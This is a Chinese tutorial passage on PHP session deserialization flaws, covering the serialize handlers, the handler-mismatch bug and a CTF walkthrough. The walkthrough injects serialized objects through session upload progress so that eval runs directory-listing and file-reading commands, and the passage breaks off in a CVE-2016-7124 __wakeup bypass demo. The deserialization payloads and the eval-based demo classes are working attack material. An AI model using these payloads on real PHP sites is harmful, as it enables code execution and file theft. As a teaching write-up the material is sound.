<h2 id="0x12-php-session反序列化">0x12 php-session反序列化</h2>
<h3 id="121-session简单介绍">12.1 session简单介绍</h3>
<p>​		在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。当第一次访问网站时，**seesion_start()**函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
<pre><code class="hljs plaintext">官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。主要有以下特点：

session保存的位置是在服务器端
session通常是要配合cookie使用

因为HTTP的无状态性，服务端产生了session来标识当前的用户状态
本质上，session就是一种可以维持服务器端的数据存储技术。即**session技术就是一种基于后端有别于数据库的临时存储数据的技术**</code></pre>
<h3 id="122-session-的存储机制">12.2 session 的存储机制</h3>
<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<br>
session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的<br>
session_start();运行之后开启session并且产生一个唯一的32位的session_id</p>
<h3 id="123-session文件创建的几个tip">12.3 session文件创建的几个tip</h3>
<p>1.代码中有session_start(),会自动创建session文件。</p>
<p>2.如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session（也就创建了session文件），不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>3.session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。</p>
<pre><code class="hljs plaintext">比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入session文件里。</code></pre>
<p>注意：如果默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空。这时我们就要利用竞争，在session文件内容清空前进行包含利用。</p>
<h3 id="124-php-session工作流程">12.4 PHP session工作流程</h3>
<p>以PHP为例，理解<code>session</code>的原理</p>
<pre><code class="hljs plaintext">1. PHP脚本使用 session_start()时开启`session`会话，会自动检测`PHPSESSID`
   - 如果`Cookie`中存在，获取`PHPSESSID`
   - 如果`Cookie`中不存在，创建一个`PHPSESSID`，并通过响应头以`Cookie`形式保存到浏览器
   
2. 初始化超全局变量`$_SESSION`为一个空数组

3. PHP通过`PHPSESSID`去指定位置（`PHPSESSID`文件存储位置）匹配对应的文件
   - 存在该文件：读取文件内容（通过反序列化方式），将数据存储到`$_SESSION`中
   - 不存在该文件： session_start()创建一个`PHPSESSID`命名文件
   
4. 程序执行结束，将`$_SESSION`中保存的所有数据序列化存储到`PHPSESSID`对应的文件中</code></pre>
<p>具体原理图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626175143920.png" alt="image-20230626175143920"></p>
<h3 id="125-phpini中一些session配置">12.5 php.ini中一些session配置</h3>
<pre><code>session.save_handler=“”		–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen	–指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.save_path="/tmp"      --设置session文件的存储位置
session.auto_start= 0          --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动
session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php  
session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用
session.upload_progress.cleanup= On --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用
</code></pre>
<h3 id="126-不同的引擎来处理session文件">12.6 不同的引擎来处理session文件</h3>
<h4 id="1-php处理器">1. php处理器</h4>
<p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626180100412.png" alt="image-20230626180100412"></p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$_SESSION[‘name’]的键名：name</td>
<td style="text-align:center">|</td>
<td style="text-align:center">s:7:“xianzhi”;</td>
</tr>
</tbody>
</table>
<h4 id="2-php_binary处理器">2. php_binary处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_binary'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'sessionsessionsessionsessionsession'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为<code>#</code>，所以最终的结果如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626180229200.png" alt="image-20230626180229200"></p>
<table>
<thead>
<tr>
<th style="text-align:center">键名的长度对应的 ASCII 字符</th>
<th style="text-align:center">键名</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">sessionsessionsessionsessionsession</td>
<td style="text-align:center">s:7:“xianzhi”;</td>
</tr>
</tbody>
</table>
<h4 id="3-php_serialize-处理器">3. php_serialize 处理器</h4>
<p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626180345266.png" alt="image-20230626180345266"></p>
<p>序列化的结果为：<code>a:1:{s:7:"session";s:7:"xianzhi";}</code></p>
<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
<h4 id="4-session的反序列化漏洞利用">4. session的反序列化漏洞利用</h4>
<p>session的反序列化漏洞，就是利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</p>
<p>php引擎的存储格式是<code>键名|serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。如果程序使用两个引擎来分别处理的话就会出现问题</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'aaa'</span>] = <span class="hljs-string">'bbb'</span>;
<span class="hljs-comment">//aaa|s:3:"bbb";</span>
<span class="hljs-comment">//该引擎使用的是php，会把'|'看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对'|'后的值进行反序列化处理。</span></code></pre>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'aaa'</span>] = <span class="hljs-string">'bbb'</span>;
<span class="hljs-comment">//a:1:{s:3:"aaa";s:3:"bbb";}</span>
<span class="hljs-comment">//php_serialize引擎只会把'|'当做一个正常的字符。</span></code></pre>
<p>具体示例分析：</p>
<p>首先创建<code>session.php</code>，使用<code>php_serialize</code>处理器来存储session数据</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'session'</span>];
<span class="hljs-meta">?&gt;</span></code></pre>
<p><code>test.php</code>，使用默认<code>php</code>处理器来存储session数据</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">f4ke</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Who are you?"</span>;
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
      <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);
    }
}
<span class="hljs-variable">$str</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">f4ke</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着，我们构建URL进行访问<code>session.php</code>：</p>
<pre><code class="hljs http">http://www.session-serialize.com/session.php?session=|O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626182515714.png" alt="image-20230626182515714"></p>
<p>打开<code>PHPSESSID</code>文件可看到序列化存储的内容</p>
<pre><code class="hljs php">a:<span class="hljs-number">1</span>:{s:<span class="hljs-number">7</span>:<span class="hljs-string">"session"</span>;s:<span class="hljs-number">45</span>:<span class="hljs-string">"|O:4:"</span>f4ke<span class="hljs-string">":1:{s:4:"</span>name<span class="hljs-string">";s:10:"</span><span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-string">";}</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626182740031.png" alt="image-20230626182740031"></p>
<p>漏洞分析：</p>
<blockquote>
<p>在<code>session.php</code>程序执行，我们将<code>|O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}</code>通过<code>php_serialize</code>处理器序列化保存成<code>PHPSESSID</code>文件；</p>
<p>由于浏览器中保存的<code>PHPSESSID</code>文件名不变，当我们访问<code>test.php</code>，<code>session_start();</code>找到<code>PHPSESSID</code>文件并使用<code>php</code>处理器反序列化文件内容，识别格式即</p>
<table>
<thead>
<tr>
<th style="text-align:center">键名</th>
<th style="text-align:center">竖线</th>
<th style="text-align:center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a:1:{s:7:“session”;s:45:"</td>
<td style="text-align:center">|</td>
<td style="text-align:center">O:4:“f4ke”:1:{s:4:“name”;s:10:“phpinfo();”;}</td>
</tr>
</tbody>
</table>
<p>php处理器会以|作为分隔符，将<code>O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}</code>反序列化，就会触发<code>__wakeup()</code>方法，最后对象销毁执行<code>__destruct()</code>方法中的<code>eval()</code>函数，相当于执行如下：</p>
<pre><code class="hljs plaintext">$_SESSION['session'] = new f4ke();
$_SESSION['session']-&gt;name = 'phpinfo();';</code></pre>
</blockquote>
<p>我们访问<code>test.php</code>，即可直接执行<code>phpinfo()</code>函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626182845552.png" alt="image-20230626182845552"></p>
<p><strong>CTF例题：PHPINFO</strong></p>
<p>找不到原题，先跟着做一遍</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//A webshell is wait for you</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'session.serialize_handler'</span>, <span class="hljs-string">'php'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;mdzz = <span class="hljs-string">'phpinfo();'</span>;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;mdzz);
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'phpinfo'</span>]))
{
    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'index.php'</span>));
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>我们可以看到<code>ini_set('session.serialize_handler', 'php')</code>，判断可能存在session反序列化漏洞，根据代码逻辑，访问URL加上<code>phpinfo</code>参数新建对象触发魔术方法执行<code>phpinfo()</code>函数，进一步查看<code>session.serialize_handler</code>配置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626183308867.png" alt="image-20230626183308867"></p>
<p>可见<code>php.ini</code>中<code>session.serialize_handler = php_serialize</code>，当前目录中被设置为<code>session.serialize_handler = php</code>，因此存在session反序列化利用的条件</p>
<p>补充知识</p>
<pre><code class="hljs plaintext">phpinfo文件中

local value(局部变量：作用于当前目录程序，会覆盖master value内容):php
master value(主变量：php.ini里面的内容):php_serialize</code></pre>
<p>那么我们如何找到代码入口将利用代码写入到<code>session</code>文件？想要写入<code>session</code>文件就得想办法在<code>$_SESSION</code>变量中增加我们可控的输入点</p>
<p>补充知识</p>
<pre><code class="hljs plaintext">Session 上传进度(此特性自 PHP 5.4.0 后可用)

当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时可以发送一个POST请求到终端（例如通过XHR）来检查这个状态

当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。</code></pre>
<p>翻译成人话就是，当检测Session 上传进度这一特性是开启状态时，我们可以在客户端写一个文件上传的功能，文件上传的同时，<code>POST</code>一个与<code>php.ini</code>中设置的<code>session.upload_progress.name</code>同名变量<code>PHP_SESSION_UPLOAD_PROGRESS</code>，如下图，即可写入<code>$_SESSION</code>，进一步序列化写入<code>session</code>文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626183628792.png" alt="image-20230626183628792"></p>
<p>下面是官方给出的一个文件上传时监测进度例子:</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"upload.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"&lt;?php echo ini_get("</span><span class="hljs-attr">session.upload_progress.name</span>"); ?&gt;</span>" value="123" /&gt;
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file1"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file2"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre>
<p>其中<code>name=""</code>也可以设置为<code>name="PHP_SESSION_UPLOAD_PROGRESS"</code></p>
<p>在session中存储的上传进度，如下所示:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"upload_progress_123"</span>] = <span class="hljs-keyword">array</span>(
 <span class="hljs-string">"start_time"</span> =&gt; <span class="hljs-number">1234567890</span>,   <span class="hljs-comment">// The request time  请求时间</span>
 <span class="hljs-string">"content_length"</span> =&gt; <span class="hljs-number">57343257</span>, <span class="hljs-comment">// POST content length 长度</span>
 <span class="hljs-string">"bytes_processed"</span> =&gt; <span class="hljs-number">453489</span>,  <span class="hljs-comment">// Amount of bytes received and processed 已接收字节</span>
 <span class="hljs-string">"done"</span> =&gt; <span class="hljs-literal">false</span>,              <span class="hljs-comment">// true when the POST handler has finished, successfully or not 是否上传完成</span>
 <span class="hljs-string">"files"</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-comment">//上传的文件</span>
  <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(
   <span class="hljs-string">"field_name"</span> =&gt; <span class="hljs-string">"file1"</span>,       <span class="hljs-comment">// Name of the &lt;input/&gt; field  input中设定的变量名</span>
   <span class="hljs-comment">// The following 3 elements equals those in $_FILES             </span>
   <span class="hljs-string">"name"</span> =&gt; <span class="hljs-string">"foo.avi"</span>,           <span class="hljs-comment">//文件名</span>
   <span class="hljs-string">"tmp_name"</span> =&gt; <span class="hljs-string">"/tmp/phpxxxxxx"</span>,
   <span class="hljs-string">"error"</span> =&gt; <span class="hljs-number">0</span>,
   <span class="hljs-string">"done"</span> =&gt; <span class="hljs-literal">true</span>,                <span class="hljs-comment">// True when the POST handler has finished handling this file</span>
   <span class="hljs-string">"start_time"</span> =&gt; <span class="hljs-number">1234567890</span>,    <span class="hljs-comment">// When this file has started to be processed</span>
   <span class="hljs-string">"bytes_processed"</span> =&gt; <span class="hljs-number">57343250</span>, <span class="hljs-comment">// Amount of bytes received and processed for this file</span>
  ),
  <span class="hljs-comment">// An other file, not finished uploading, in the same request</span>
  <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(
   <span class="hljs-string">"field_name"</span> =&gt; <span class="hljs-string">"file2"</span>,
   <span class="hljs-string">"name"</span> =&gt; <span class="hljs-string">"bar.avi"</span>,
   <span class="hljs-string">"tmp_name"</span> =&gt; <span class="hljs-literal">NULL</span>,
   <span class="hljs-string">"error"</span> =&gt; <span class="hljs-number">0</span>,
   <span class="hljs-string">"done"</span> =&gt; <span class="hljs-literal">false</span>,
   <span class="hljs-string">"start_time"</span> =&gt; <span class="hljs-number">1234567899</span>,
   <span class="hljs-string">"bytes_processed"</span> =&gt; <span class="hljs-number">54554</span>,
  ),
 )
);</code></pre>
<p>其中，session中的<code>field_name</code>和<code>name</code>都是我们可控的输入点！</p>
<p>下面我们就开始解题拿到flag</p>
<p>首先，<code>http://web.jarvisoj.com:32784/index.php?phpinfo</code>查询设置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626184058849.png" alt="image-20230626184058849"></p>
<pre><code class="hljs plaintext">session.upload_progress.enabled = On   --表明允许上传进度跟踪，并填充$ _SESSION变量
session.upload_progress.cleanup = Off  --表明所有POST数据（即完成上传）后，不清理进度信息($ _SESSION变量)</code></pre>
<p>即允许上传进度跟踪且结束后不清除数据，更有利使用<code>session.upload_progress.name</code>来将利用代码写入<code>session</code>文件</p>
<p>构造<code>POST</code>表单提交上传文件</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file"</span> /&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre>
<p>构造序列化字符串作为<code>payload</code>（利用代码）</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>=<span class="hljs-string">'print_r(scandir(dirname(__FILE__)));'</span>;
}
<span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">//O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}</span></code></pre>
<p>为了防止<code>"</code>被转义，我们在<code>payload</code>中加入<code>\</code></p>
<p>随意选择文件，点击表单提交，使用抓包工具<code>burpsuite</code>抓取请求包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626184235633.png" alt="image-20230626184235633"></p>
<p>并修改<code>filename</code>值为</p>
<pre><code class="hljs php">|O:<span class="hljs-number">5</span>:\<span class="hljs-string">"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}</span></code></pre>
<p>发送请求包，代码执行过程分析：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626184320730.png" alt="image-20230626184320730"></p>
<p>因此直接执行<code>print_r(scandir(dirname(__FILE__)));</code>并返回</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626184641153.png" alt="image-20230626184641153"></p>
<pre><code class="hljs php">phpinfo`查看当前目录，`/opt/lampp/htdocs/</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626184700223.png" alt="image-20230626184700223"></p>
<p>构造最终<code>payload</code>读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>文件内容，即flag</p>
<pre><code class="hljs php">|O:<span class="hljs-number">5</span>:\<span class="hljs-string">"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626184723948.png" alt="image-20230626184723948"></p>
<p>这里不知道为啥访问不了连接，找到了原靶场也不行…</p>
<p><strong>ctfshow web263</strong></p>
<p><strong>session.upload_progress进行文件包含和反序列化渗透</strong><br>
<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.ht">https://www.freebuf.com/vuls/202819.ht</a></p>
<h2 id="127-cve-2016-7124">12.7 CVE-2016-7124</h2>
<h3 id="漏洞分析">漏洞分析</h3>
<p>该漏洞存在于PHP5小于5.6.25版本或PHP7小于7.0.10版本中，该漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup()</code>的执行，demo如下</p>
<pre><code class="hljs php">&lt;html&gt;
&lt;head&gt;
&lt;title&gt;PHP反序列化demo&lt;/title&gt;
&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
&lt;/head&gt;
&lt;body&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">"Jacky"</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">"hello.php"</span>,<span class="hljs-string">"w"</span>);
        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$this</span>-&gt;name);
        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">        </span>{
            <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-variable">$this</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {
                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$k</span> = <span class="hljs-literal">null</span>;
            }
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Waking up...\n"</span>;
        }
}
